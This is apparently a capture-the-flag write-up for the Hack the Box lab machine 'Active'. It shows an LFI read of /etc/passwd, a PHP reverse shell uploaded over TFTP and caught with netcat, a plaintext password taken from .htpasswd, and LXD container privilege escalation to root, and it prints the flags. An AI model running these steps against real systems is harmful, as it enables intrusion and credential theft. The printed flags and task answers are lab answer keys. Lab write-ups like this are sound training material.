# Active
* Source: [Hack the Box](https://hackthebox.com/)
* Challenge: Active
* Topic: [[FTP]] [[Java]] [[PHP]] [[LFI]]
* Difficulty: Very easy
* Date: 19-04-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Tasks
1. What service is running on the target machine over UDP? 
 - **tftp**
2. What class of vulnerability is the webpage that is hosted on port 80 vulnerable to? 
- **local file inclusion**
3. What is the default system folder that TFTP uses to store files? 
- **/var/lib/tftpboot/**
4. Which interesting file is located in the web server folder and can be used for Lateral Movement? 
- **.htpasswd**
5. What is the group that user Mike is a part of and can be exploited for Privilege Escalation? 
- **lxd**
6. When using an image to exploit a system via containers, we look for a very small distribution. Our favorite for this task is named after mountains. What is that distribution name? 
- **alpine**
7. What flag do we set to the container so that it has root privileges on the host system? 
- **security.privileged=true**
8. If the root filesystem is mounted at /mnt in the container, where can the root flag be found on the container after the host system is mounted? 
- **/mnt/root/**
8. Submit user flag.
- **a56ef91d70cfbf2cdb8f454c006935a1**


---
## Flag:
Nmap TCP scan:

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -n -sC -sV -Pn 10.129.95.185    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-17 11:07 EDT
Nmap scan report for 10.129.95.185
Host is up (0.069s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.129.95.185/?file=home.php
|_http-server-header: Apache/2.4.29 (Ubuntu)

Nmap done: 1 IP address (1 host up) scanned in 10.08 seconds
```

Hosting a webpage.

![](./attachments/Pasted%20image%2020220417174528.png)

Might be vulnerable to LFI (Local File Inclusion).

We can test this by inserting a path that we know exists. There are multiple to choose from, both `/etc/passwd` and `/etc/hosts` will do fine.

This will be a bit easier to do in `curl` so let's switch to that.

```console
┌──(kali㉿kali)-[~]
└─$ curl http://10.129.95.185/?file=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
mike:x:1000:1000:mike:/home/mike:/bin/bash
tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
```

We get the contents of `passwd` which means the website is vulnerable to LFI.

Also, the last user in the output is called TFPT which is a super lightweight version of FTP. For example, it has no authentication. We should just be able to login.

It runs on UDP, so we need to do an extra nmap scan to find it:

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -n -sU 10.129.95.185 
Nmap scan report for 10.129.95.185
Host is up (0.068s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc
69/udp open|filtered tftp

Nmap done: 1 IP address (1 host up) scanned in 1217.81 seconds
```

It's running on UDP port 69.

We can use `tftp` to upload a reverse shell, then execute it with a payload delivered via the LFI vulnerability we found earlier.

First we need a PHP reverse shell, we can make one ourselves, or we can find one online. [This](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) one seems to have potential.

Save the file by right-clicking, then 'Save Page As...' and save it as `shell.php`.

![](./attachments/Pasted%20image%2020220417182958.png)

Edit the IP and Port fields in the reverse shell script.

![](./attachments/Pasted%20image%2020220417183945.png)

Now we can upload it to the server using `tftp`.

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ tftp 10.129.95.185
tftp> put shell.php
Sent 5683 bytes in 0.8 seconds
```

The file is uploaded, now for the execution part of it.

First, we need to set up netcat to catch the incoming connection.

```console 
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

And then execution of the script via `curl`, it would work just as well via the browser URL field.

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ curl http://10.129.95.185/?file=/var/lib/tftpboot/shell.php
```

In the netcat terminal, we get an incoming connection. We are in!

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.95.185] 45574
Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 16:46:24 up  1:39,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

We need to escalate our privileges if we want to get access to the flags. The `/var/www/html` directory of a web server often contains passwords hardcoded into configuration files.

To get a proper TTY shell, we need to execute:

`python3 -c 'import pty;pty.spawn("/bin/bash")'`



```console 
www-data@included:/$ cd /var/www/html    
www-data@included:/var/www/html$ ls -lah
total 88K
drwxr-xr-x 4 root     root     4.0K Oct 13  2021 .
drwxr-xr-x 3 root     root     4.0K Apr 23  2021 ..
-rw-r--r-- 1 www-data www-data  212 Apr 23  2021 .htaccess
-rw-r--r-- 1 www-data www-data   17 Apr 23  2021 .htpasswd
-rw-r--r-- 1 www-data www-data  14K Apr 29  2014 default.css
drwxr-xr-x 2 www-data www-data 4.0K Apr 23  2021 fonts
-rw-r--r-- 1 www-data www-data  20K Apr 29  2014 fonts.css
-rw-r--r-- 1 www-data www-data 3.7K Oct 13  2021 home.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 23  2021 images
-rw-r--r-- 1 www-data www-data  145 Oct 13  2021 index.php
-rw-r--r-- 1 www-data www-data  17K Apr 29  2014 license.txt
www-data@included:/var/www/html$ cat .htpasswd
mike:Sheffield19
```

We got mikes password, lets login.

User:pass `mike:Sheffield19`

```
www-data@included:/$ su mike
Password: Sheffield19
mike@included:/$ cd home/mike
mike@included:~$ ls
user.txt
mike@included:~$ cat user.txt   
a56ef91d70cfbf2cdb8f454c006935a1
```

The user flag: `a56ef91d70cfbf2cdb8f454c006935a1`

Now for the root flag.

We can use `id` to see all the group's mike is a member of.

```console
mike@included:/$ id
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
```

Everything looks normal except for lxd.

Upon searcing for an exploit we find [this](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) guide.

First we need to install Go and some other dependencies.

```console
┌──(kali㉿kali)-[~]
└─$ sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
[sudo] password for kali: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done

(...)
```

Then we need to get LXC Distribution Builder from git. 

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ git clone https://github.com/lxc/distrobuilder                    
Cloning into 'distrobuilder'...
remote: Enumerating objects: 5104, done.
remote: Counting objects: 100% (680/680), done.
remote: Compressing objects: 100% (146/146), done.
remote: Total 5104 (delta 577), reused 560 (delta 532), pack-reused 4424
Receiving objects: 100% (5104/5104), 1.81 MiB | 1.64 MiB/s, done.
Resolving deltas: 100% (3363/3363), done.
 
┌──(kali㉿kali)-[~/Downloads]
└─$ cd distrobuilder
 
┌──(kali㉿kali)-[~/Downloads/distrobuilder]
└─$ make        
gofmt -s -w .
go install -v ./...
go: downloading github.com/flosch/pongo2 v0.0.0-20200913210552-0d938eb266f3
go: downloading github.com/lxc/lxd v0.0.0-20220330110539-f7a4698244cb
go: downloading github.com/sirupsen/logrus v1.8.1
go: downloading github.com/spf13/cobra v1.4.0
go: downloading golang.org/x/sys v0.0.0-20220330033206-e17cdc41300f
go: downloading gopkg.in/yaml.v2 v2.4.0

(...)
```

Lastly, we need to download the Alpine YAML file and build it.

```console
┌──(kali㉿kali)-[~/Downloads/distrobuilder]
└─$ mkdir -p $HOME/ContainerImages/alpine/
       
┌──(kali㉿kali)-[~/Downloads/distrobuilder]
└─$ cd $HOME/ContainerImages/alpine/
       
┌──(kali㉿kali)-[~/ContainerImages/alpine]
└─$ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
--2022-04-18 16:34:52--  https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15551 (15K) [text/plain]
Saving to: ‘alpine.yaml’

alpine.yaml           100%[=================>]  15.19K  --.-KB/s    in 0s      

2022-04-18 16:34:52 (37.4 MB/s) - ‘alpine.yaml’ saved [15551/15551]
 
┌──(kali㉿kali)-[~/ContainerImages/alpine]
└─$ sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
INFO[2022-04-18T16:35:03-04:00] Downloading source                           
/tmp/distrobuilder/alpinelinux-3.8-x86_64/alpine-minirootfs-3.8.0-x86_64.tar.gz: 100% (5.67MB/s)
/tmp/distrobuilder/alpinelinux-3.8-x86_64/alpine-minirootfs-3.8.0-x86_64.tar.gz.asc: 100% (3.02GB/s)
gpg: Signature made Tue 26 Jun 2018 10:24:34 AM EDT

(...)

┌──(kali㉿kali)-[~/ContainerImages/alpine]
└─$ ls                                                                        
alpine.yaml  lxd.tar.xz  rootfs.squashfs
```

Then we need to transfer `lxd.tar.xz` and `rootfs.squashfs` to the server. We will use a simple Python3 HTTP server.

```console
python3 -m http.server 8000
```

Back on the target machine:

```console 
mike@included:~$ wget http://10.10.14.15:8000/lxd.tar.xz
wget http://10.10.14.15:8001/lxd.tar.xz
--2022-04-18 20:48:57--  http://10.10.14.15:8000/lxd.tar.xz
Connecting to 10.10.14.15:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 864 [application/x-xz]
Saving to: ‘lxd.tar.xz’

lxd.tar.xz          100%[===================>]     864  --.-KB/s    in 0s      

2022-04-18 20:48:57 (17.7 MB/s) - ‘lxd.tar.xz’ saved [864/864]

mike@included:~$ wget http://10.10.14.15:8000/rootfs.squashfs
wget http://10.10.14.15:8001/rootfs.squashfs
--2022-04-18 20:49:12--  http://10.10.14.15:8000/rootfs.squashfs
Connecting to 10.10.14.15:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2052096 (2.0M) [application/octet-stream]
Saving to: ‘rootfs.squashfs’

rootfs.squashfs     100%[===================>]   1.96M  3.27MB/s    in 0.6s    

2022-04-18 20:49:13 (3.27 MB/s) - ‘rootfs.squashfs’ saved [2052096/2052096]
```

First import the image with `lcx`.

```console
mike@included:~$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
```

To confirm:

```
mike@included:~$ lxc image list
lxc image list
+--------+--------------+--------+----------------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |              DESCRIPTION               |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+----------------------------------------+--------+--------+------------------------------+
| alpine | d42f02dfffa6 | no     | Alpinelinux 3.8 x86_64 (20220418_2035) | x86_64 | 1.96MB | Apr 18, 2022 at 8:50pm (UTC) |
+--------+--------------+--------+----------------------------------------+--------+--------+------------------------------+
```

Now for the execution. First, we need to set the `security.privileged` flag to true in order to give us root privileges. Afterwards, we will mount the root file system to `/mnt` so we have access to all the root files.

```console
mike@included:~$ lxc init alpine privesc -c security.privileged=true
Creating privesc
mike@included:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
<st-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc
```

Finally, we can launch the container and spawn the shell.

```console
mike@included:~$ lxc start privesc
lxc start privesc
mike@included:~$ lxc exec privesc /bin/sh
lxc exec privesc /bin/sh
~ # whoami  
root
```

And get the flag.

```console
/ # cd mnt/root/root
/mnt/root/root # ls       
root.txt
/mnt/root/root # cat root.txt
c693d9c7499d9f572ee375d4c14c7bcf
```

**Flag:** `c693d9c7499d9f572ee375d4c14c7bcf`

---
**Tags:** [[HackTheBox]]